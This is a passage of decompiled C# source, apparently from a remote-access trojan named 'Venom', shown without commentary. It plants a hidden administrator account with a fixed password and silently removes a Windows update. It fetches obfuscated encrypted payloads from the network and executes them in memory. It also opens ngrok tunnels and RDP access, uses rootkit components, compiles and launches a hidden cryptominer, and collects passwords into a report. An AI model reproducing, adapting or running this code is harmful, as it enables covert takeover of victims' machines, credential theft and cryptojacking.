					((Principal)val6).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex6)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex6);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val6).Dispose();
			((Principal)val5).Dispose();
			val4.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 10:
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd",
				Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
				CreateNoWindow = true,
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				ErrorDialog = false
			});
			RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey3 == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey3.SetValue("dontdisplaylastusername", 1);
			}
			registryKey3.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey3.SetValue("DWORD", 2);
			}
			registryKey3.Flush();
			string text2 = "Venom";
			string password2 = "Venom";
			PrincipalContext val7 = null;
			try
			{
				Console.WriteLine("Building System Information");
				val7 = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex7)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex7);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val7, text2) != null)
			{
				Console.WriteLine(text2 + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val8 = new UserPrincipal(val7);
			((Principal)val8).set_Name(text2);
			((Principal)val8).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val8).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val8).SetPassword(password2);
			((AuthenticablePrincipal)val8).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val8).Save();
			}
			catch (Exception ex8)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex8);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val9 = null;
			try
			{
				val9 = GroupPrincipal.FindByIdentity(val7, "Administrators");
				if (val9 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val9.get_Members().Contains(val7, (IdentityType)0, text2))
					{
						Console.WriteLine("Administrators already contains " + text2);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val9.get_Members().Add(val8);
					((Principal)val9).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex9)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex9);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val9).Dispose();
			((Principal)val8).Dispose();
			val7.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		case 5:
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			else
			{
				registryKey.SetValue("dontdisplaylastusername", 1);
			}
			registryKey.Flush();
			if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true) == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", writable: true)!.SetValue("DWORD", 2);
			}
			else
			{
				registryKey.SetValue("DWORD", 2);
			}
			registryKey.Flush();
			string text = "Venom";
			string password = "Venom";
			PrincipalContext val = null;
			try
			{
				Console.WriteLine("Building System Information");
				val = new PrincipalContext((ContextType)0, (string)null);
			}
			catch (Exception ex)
			{
				Console.WriteLine("Failed to create System Context.");
				Console.WriteLine("Exception: " + ex);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Checking if User Exists.");
			if (UserPrincipal.FindByIdentity(val, text) != null)
			{
				Console.WriteLine(text + " already exists. Exiting!!");
				Console.ReadLine();
				break;
			}
			Console.WriteLine("Building User Information");
			UserPrincipal val2 = new UserPrincipal(val);
			((Principal)val2).set_Name(text);
			((Principal)val2).set_DisplayName("Venom Administrative User");
			((AuthenticablePrincipal)val2).set_PasswordNeverExpires(true);
			((AuthenticablePrincipal)val2).SetPassword(password);
			((AuthenticablePrincipal)val2).set_Enabled((bool?)true);
			try
			{
				Console.WriteLine("Creating New User");
				((Principal)val2).Save();
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Failed to create user.");
				Console.WriteLine("Exception: " + ex2);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
				break;
			}
			GroupPrincipal val3 = null;
			try
			{
				val3 = GroupPrincipal.FindByIdentity(val, "Administrators");
				if (val3 != null)
				{
					Console.WriteLine("Checking if itadmin is part of Administrators Group");
					if (val3.get_Members().Contains(val, (IdentityType)0, text))
					{
						Console.WriteLine("Administrators already contains " + text);
						break;
					}
					Console.WriteLine("Adding itadmin to Administrators Group");
					val3.get_Members().Add(val2);
					((Principal)val3).Save();
					break;
				}
				Console.WriteLine("Could not find the group Administrators");
			}
			catch (Exception ex3)
			{
				Console.WriteLine("Exception adding user to group.");
				Console.WriteLine("Exception: " + ex3);
				Console.WriteLine();
				Console.WriteLine("Press Any Key to Continue");
				Console.ReadLine();
			}
			Console.WriteLine("Cleaning Up");
			((Principal)val3).Dispose();
			((Principal)val2).Dispose();
			val.Dispose();
			Console.WriteLine();
			Console.WriteLine("Press Any Key to Continue");
			Console.ReadLine();
			break;
		}
		}
	}

	public static void smethod_22()
	{
		string path = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)), "Venom");
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		Task.Run((Action)smethod_92).Wait();
	}

	public static void smethod_23()
	{
		string path = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEIV2sXOWTgN+Pcj462ljl3Oel4j7/mHDp79pNiFrTs78w=="))))).ReadToEnd();
		Path.Combine(path, "addex.exe");
		byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
		Task.Run(delegate
		{
			smethod_29(byte_0);
		}).Wait();
	}

	public static void smethod_24()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		new ServiceController("TermService").Stop();
		smethod_80();
		smethod_85();
		string text = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell " + text + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		string text2 = "C:\\Program Files\\RDP Wrapper";
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b del /q/f/s " + text2 + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Directory.Delete(text2, recursive: true);
		smethod_114();
		File.SetAttributes(text2, FileAttributes.Normal);
		File.Delete(text2);
	}

	public static void smethod_25()
	{
		Task.Run(delegate
		{
			smethod_24();
		}).Wait();
		Task.Run(() => Class2.smethod_7()).Wait();
		Task.Run(delegate
		{
			smethod_85();
		}).Wait();
		Task.Run(delegate
		{
			Class2.smethod_2();
		}).Wait();
	}

	public static void smethod_26()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("ngrok");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("rdpclip");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("rdpinstall");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom-ngrok");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("Venom-winvnc");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch
		{
		}
	}

	public static void smethod_27()
	{
		string text = Path.Combine(Path.Combine(GClass5.string_4, GClass5.string_5), "Venom");
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		else
		{
			Directory.Delete(text);
			Directory.CreateDirectory(text);
		}
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEKpND3C57oKLuSoz2v0dV0bH4OpoapDChUYkbYYFnLcWg=="))))).ReadToEnd();
		byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
		Task.Run(delegate
		{
			smethod_29(byte_0);
		}).Wait();
		string encrypted2 = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEIiZVQ0kG2wUYnLtVlMfGzyoXu9rYGMvy2WPGxRHvbNuw=="))))).ReadToEnd();
		byte[] byte_1 = Convert.FromBase64String(smethod_58(encrypted2));
		Task.Run(delegate
		{
			smethod_29(byte_1);
		}).Wait();
		string encrypted3 = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufBRxadFEongss8PG/bC9lI1"))))).ReadToEnd();
		Path.Combine(text, "addex.exe");
		byte[] byte_2 = Convert.FromBase64String(smethod_58(encrypted3));
		Task.Run(delegate
		{
			smethod_29(byte_2);
		}).Wait();
	}

	private static void smethod_28(byte[] kaka)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(kaka);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
			}
			catch
			{
			}
		});
		thread.IsBackground = false;
		thread.Start();
	}

	public static void smethod_29(byte[] purdi)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load(purdi);
			MethodInfo methodInfo = smethod_32(assembly);
			object obj = assembly.CreateInstance(methodInfo.Name);
			object[] obj2 = new object[1];
			if (methodInfo.GetParameters().Length == 0)
			{
				obj2 = null;
			}
			smethod_30(methodInfo, obj, obj2);
		}
		catch
		{
		}
	}

	private static object smethod_30(MethodInfo meth, object obj1, object[] obj2)
	{
		if (meth != null)
		{
			return meth.Invoke(obj1, obj2);
		}
		return false;
	}

	public static Thread smethod_31(byte[] bytes)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			MethodInfo entryPoint = Assembly.Load(bytes).EntryPoint;
			if (entryPoint != null)
			{
				entryPoint.Invoke(null, null);
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		return thread;
	}

	private static MethodInfo smethod_32(Assembly obj)
	{
		if (obj != null)
		{
			return obj.EntryPoint;
		}
		return null;
	}

	public static void smethod_33()
	{
		if (!Directory.Exists(dkPassDirectory))
		{
			Directory.CreateDirectory(dkPassDirectory);
		}
		else
		{
			Directory.Delete(dkPassDirectory, recursive: true);
			Directory.CreateDirectory(dkPassDirectory);
		}
		try
		{
			string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufAW7GCW9GjpuWcfklYXAs6CiBoXBbf1Lv3a+mDn1iQPmA=="))))).ReadToEnd();
			byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
			Path.Combine(Path.GetTempPath(), "firefox.exe");
			Task.Run(delegate
			{
				smethod_29(byte_0);
			}).Wait();
		}
		catch
		{
		}
		smethod_98("Compress-Archive -Path " + tozip + " -DestinationPath " + dkPassDirectoryzip + "  & exit");
		smethod_75(tozip, dkPassDirectoryzip);
	}

	public static void smethod_34(string directory)
	{
		try
		{
			string text = GClass5.string_12;
			string text2 = "http";
			string tempPath = Path.GetTempPath();
			string text3 = Path.Combine(tempPath, "Venom");
			if (!Directory.Exists(text3))
			{
				Directory.CreateDirectory(text3);
			}
			string @string = Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZL55WPp1zFAZn8zSVFhxCWcj8ZwVoOyAh3WyvInTOcAh1+e5NguCqUj9siUnyU8QPXCWprAFrmvVH0I47l4XKF0CU6+9UCVTN5OD1t5yFpLak6BKCf30RLXOpMaw4zZAX+5byXxPbbzmQCnuxE/Oa5N")));
			new WebClient().DownloadFile(@string, Path.Combine(tempPath, "ngrok.zip"));
			smethod_74(Path.Combine(tempPath, "ngrok.zip"), text3);
			string[] files = Directory.GetFiles(Path.GetTempPath(), "*.zip");
			for (int i = 0; i < files.Length; i++)
			{
				File.Delete(files[i]);
			}
			string text4 = "file:///" + directory;
			string text5 = Path.Combine(text3, "ngrok.exe");
			string text6 = Path.Combine(text3, "proclog.txt");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(text3, "grok.bat"));
			streamWriter.WriteLine("set logFile=" + text6);
			streamWriter.WriteLine("set exeFile=" + text5);
			streamWriter.WriteLine("set directory=" + directory);
			streamWriter.WriteLine("set directory1=" + text4);
			streamWriter.WriteLine("set protoc=" + text2);
			streamWriter.WriteLine("%exeFile% authtoken " + text);
			streamWriter.WriteLine("cd " + directory);
			streamWriter.WriteLine("%exeFile%  %protoc% \"%directory1%\" > %logFile%");
			streamWriter.Close();
			smethod_98(Path.Combine(text3, "grok.bat"));
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_35()
	{
		string text = string.Empty;
		string result = text;
		try
		{
			using (Stream stream = new WebClient().OpenRead("http://127.0.0.1:4040/api/tunnels"))
			{
				using StreamReader streamReader = new StreamReader(stream);
				string input = streamReader.ReadToEnd();
				string pattern = "((tcp?|http?|tcp|http):((//)|(\\\\\\\\))+[\\w\\d:#@%/;$()~_?\\+-=\\\\\\.&]*)";
				MatchCollection matchCollection = Regex.Matches(input, pattern);
				foreach (Match item in matchCollection)
				{
					string text2 = "tcp://";
					string? text3 = Convert.ToString(item);
					text = text3!.Substring(text3!.IndexOf(text2) + text2.Length);
				}
				foreach (Match item2 in matchCollection)
				{
					string text4 = "http://";
					string? text5 = Convert.ToString(item2);
					text = text5!.Substring(text5!.IndexOf(text4) + text4.Length);
				}
			}
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return result;
		}
	}

	public static void smethod_36()
	{
		File.Delete(string_2);
		Path.Combine(Application.get_StartupPath(), "DarkEye_Passwords.html");
		string contents = "<!DOCTYPE html>" + Environment.NewLine + "<html>" + Environment.NewLine + "<head>" + Environment.NewLine + "<center><title>Venom Recovery Report</title></center>" + Environment.NewLine + "<link rel=shortcut icontype=image/pnghref=fav.ico/>" + Environment.NewLine + "</head>" + Environment.NewLine + "<center><img src = logo.png alt=centered image> </center>" + Environment.NewLine + " <center><h2>Venom Recovery Report</h2></center>" + Environment.NewLine + "<body> " + Environment.NewLine;
		string contents2 = "</div>" + Environment.NewLine + "</body>" + Environment.NewLine + "</html>" + Environment.NewLine;
		string[] array = File.ReadAllLines(string_2);
		File.WriteAllText(string_3, contents);
		string[] array2 = array;
		foreach (string text in array2)
		{
			File.AppendAllText(string_3, "<hr size=1 width=100% color=black>" + Environment.NewLine + "<center><h2><font size=2>" + text + "</font></h1></center>");
		}
		File.AppendAllText(string_3, contents2);
		File.Delete(string_2);
	}

	public static void smethod_37(string pool, string wallet, string password)
	{
		byte[] bytes = Convert.FromBase64String(smethod_58(new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEKqQ+j67oBoT2z2qfHg14RFRfwf2L/5ZuZCOISZ7KrAzA=="))))).ReadToEnd()));
		File.WriteAllBytes(Path.GetTempPath() + "withLove.bin", bytes);
		try
		{
			_ = Path.GetTempPath() + "withLove.bin";
			string path = "RegAsm.exe";
			string args = $"-B --donate-level=1 -t {Environment.ProcessorCount / 2} -v 0 --cpu-priority=3 -a cn/r -k -o \" " + pool + " \" -u \" " + wallet + " \" -p \" " + password + " \"";
			smethod_38();
			GClass61.smethod_0(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), path), GClass53.smethod_0(File.ReadAllBytes(Path.GetTempPath() + "withLove.bin")), args, protect: false);
		}
		catch
		{
		}
	}

	public static void smethod_38()
	{
		Task.Run((Action)smethod_39).Wait();
		try
		{
			Process[] processesByName = Process.GetProcessesByName("minerd");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			processesByName = Process.GetProcessesByName("minewormwork");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
		}
		catch
		{
		}
		Directory.Delete(Path.Combine(Path.GetTempPath(), "mineworm"), recursive: true);
		smethod_85();
	}

	private static void smethod_39()
	{
		try
		{
			bool[] array = new bool[2] { true, false };
			foreach (bool flag in array)
			{
				using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", writable: true);
				if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("$77-"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
				else if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("winvnc"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
				else if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("mineworm"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
				else if ((registryKey.GetValue("AppInit_DLLs", "") as string).Contains("minerd"))
				{
					registryKey.SetValue("AppInit_DLLs", "");
				}
			}
		}
		catch
		{
		}
	}

	public static string smethod_40(Process process)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id);
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementBaseObject? obj = ((IEnumerable)val2).Cast<ManagementBaseObject>().SingleOrDefault();
					return (obj == null) ? null : obj!.get_Item("CommandLine")?.ToString();
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return "";
	}

	private static string smethod_41(int size)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i < size + 1; i++)
		{
			char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random_0.NextDouble() + 65.0)));
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void smethod_42(string Pool, string Wallet, string Password, string Algo, string Threads)
	{
		string path = Path.Combine(Path.GetTempPath(), "mineworm");
		Path.Combine(path, "mineworm.bat");
		string text = Path.Combine(path, "mineworm.exe");
		if (File.Exists(text))
		{
			smethod_98(text);
			File.Delete(Path.Combine(Path.GetTempPath(), "minewormworkout.exe"));
		}
		else
		{
			smethod_46(Pool, Wallet, Password, Algo, Threads);
			smethod_98(text);
		}
		if (Process.GetProcessesByName("minerd").Length == 0)
		{
			Console.WriteLine("nothing");
		}
		else
		{
			smethod_98(text);
		}
		File.Delete(Path.Combine(Path.GetTempPath(), "minewormworkout.exe"));
	}

	public static void smethod_43()
	{
		if (Directory.Exists(string_5))
		{
			Directory.Delete(string_5, recursive: true);
		}
		Directory.CreateDirectory(string_5);
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufADkY5vVIkbqyYOLhgaSgMtVkD80S5IvRbSbZvE8djdGw=="))))).ReadToEnd();
		byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
		Task.Run(delegate
		{
			File.WriteAllBytes(string_14, byte_0);
		}).Wait();
		Process.Start(string_14);
	}

	public static void smethod_44()
	{
		string encrypted = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("qiimzYPx0mUYk1Rr2FKAAqLWPVpJZfdW3vSNIZqoEAAXhFSxVMu4607KCwORqyR8d380oEo85zusjT/tI8oIWGaXObaAvVU95fBcDgAWSEIkWi3sLUNRh0Us6PpUJTJU/MlGxIz2bPjpalNjhg2ZIcexmyTaTR06cglMzpKyszA="))))).ReadToEnd();
		byte[] byte_0 = Convert.FromBase64String(smethod_58(encrypted));
		Task.Run(delegate
		{
			smethod_29(byte_0);
		}).Wait();
		File.Delete(Path.Combine(Path.GetTempPath(), "r77-x64.dll"));
		File.Delete(Path.Combine(Path.GetTempPath(), "r77-x86.dll"));
		string encrypted2 = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZLpApyDHLbEXqnGn1FyZg7Eq9i/pG9iADhVnXwVkBIvQwJiMaH4nY12/3X8x8A4ufC1uEKwOfFncL3zY4OSoglTCShqS22/MD5ofOX6HxfFjA=="))))).ReadToEnd();
		byte[] byte_1 = Convert.FromBase64String(smethod_58(encrypted2));
		Task.Run(delegate
		{
			smethod_29(byte_1);
		}).Wait();
		File.Delete(Path.Combine(Path.GetTempPath(), "minewormworkout.exe"));
		File.Delete(Path.Combine(Path.GetTempPath(), "r77-x64.dll"));
		File.Delete(Path.Combine(Path.GetTempPath(), "r77-x86.dll"));
	}

	public static void smethod_45(string cmd)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "C:\\Windows\\System32\\cmd.exe",
			Arguments = " /C " + cmd,
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden,
			RedirectStandardOutput = true,
			CreateNoWindow = true
		};
		process.Start();
	}

	public static void smethod_46(string Pool, string Wallet, string Password, string Algo, string Threads)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		string text = Path.Combine(Path.GetTempPath(), "mineworm");
		if (Directory.Exists(text))
		{
			Directory.Delete(text);
			Directory.CreateDirectory(text);
		}
		else
		{
			Directory.CreateDirectory(text);
		}
		CompilerParameters val = new CompilerParameters();
		val.set_IncludeDebugInformation(false);
		val.set_CompilerOptions(" /target:winexe /platform:anycpu /optimize+");
		val.set_OutputAssembly(Path.Combine(text, "mineworm.exe"));
		val.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val.get_ReferencedAssemblies().Add("System.dll");
		string mM = GClass4.MM;
		mM = mM.Replace("%pool%", Pool).Replace("%user%", Wallet).Replace("%password%", Password)
			.Replace("%algo%", Algo)
			.Replace("%threads%", Threads);
		foreach (CompilerError item in (CollectionBase)(object)((CodeDomProvider)new CSharpCodeProvider((IDictionary<string, string>)new Dictionary<string, string> { { "CompilerVersion", "v4.0" } })).CompileAssemblyFromSource(val, new string[1] { mM }).get_Errors())
		{
			MessageBox.Show(((object)item).ToString());
		}
	}

	public static void smethod_47(string Pool, string Wallet, string Password, string Algo, string Threads)
	{
		//IL_0040: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Expected O, but got Unknown
		string mM = GClass4.MM;
		mM = mM.Replace("%pool%", Pool).Replace("%user%", Wallet).Replace("%password%", Password)
			.Replace("%algo%", Algo)
			.Replace("%threads%", Threads);
		CompilerParameters val = new CompilerParameters();
		Directory.GetCurrentDirectory();
		val.set_GenerateInMemory(true);
		val.set_TreatWarningsAsErrors(false);
		val.set_GenerateExecutable(false);
		val.set_CompilerOptions("/optimize");
		string[] value = new string[3] { "System.dll", "mscorlib.dll", "System.Management.Automation.dll" };
		val.get_ReferencedAssemblies().AddRange(value);
		CompilerResults val2 = ((CodeDomProvider)new CSharpCodeProvider()).CompileAssemblyFromSource(val, new string[1] { mM });
		if (val2.get_Errors().get_HasErrors())
		{
			string text = "Compile error: ";
			foreach (CompilerError item in (CollectionBase)(object)val2.get_Errors())
			{
				CompilerError val3 = item;
				text = text + "\r\n" + ((object)val3).ToString();
			}
			throw new Exception(text);
		}
		Module module = val2.get_CompiledAssembly().GetModules()[0];
		Type type = null;
		MethodInfo methodInfo = null;
		if (module != null)
		{
			type = module.GetType("System.Program");
		}
		if (type != null)
		{
			methodInfo = type.GetMethod("Main");
		}
		if (methodInfo != null)
		{
			methodInfo.Invoke(null, null);
		}
	}

	public static void smethod_48(string Pool, string Wallet, string Password, string Algo, string Threads)
	{
		try
		{
			string text = " -o " + Pool + " -u " + Wallet + " -p " + Password + " -a " + Algo + " -t " + Threads;
			string path = Path.Combine(Path.GetTempPath(), "mineworm");
			string text2 = Path.Combine(path, "minerd.exe");
			StreamWriter streamWriter = new StreamWriter(Path.Combine(path, "mineworm.bat"));
			streamWriter.WriteLine("set exeFile=" + text2);
			streamWriter.WriteLine("sleep 5s");
			streamWriter.WriteLine("%exeFile%  " + text + " ");
			streamWriter.Close();
		}
		catch
		{
		}
	}

	public static void smethod_49(string pool, string user, string password, string algo, string threads, string startup, string silentmode)
	{
		string mM = GClass4.MM;
		_ = Path.GetPathRoot(Application.get_ExecutablePath()) + "Users\\" + Environment.UserName + "\\AppData\\Local\\MinerConfig";
		mM = mM.Replace("%pool%", pool).Replace("%user%", user).Replace("%password%", password)
			.Replace("%threads%", threads)
			.Replace("%algo%", algo)
			.Replace("%mutex%", smethod_41(30));
		mM = mM.Replace("%Startup();%", startup).Replace("%Persistence();%", "Persistence();");
		string text = Path.Combine(Path.GetTempPath(), "mineworm.exe");
		smethod_50(text, mM);
		Process.Start(text);
	}

	public static bool smethod_50(string EXE_Name, string Source)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
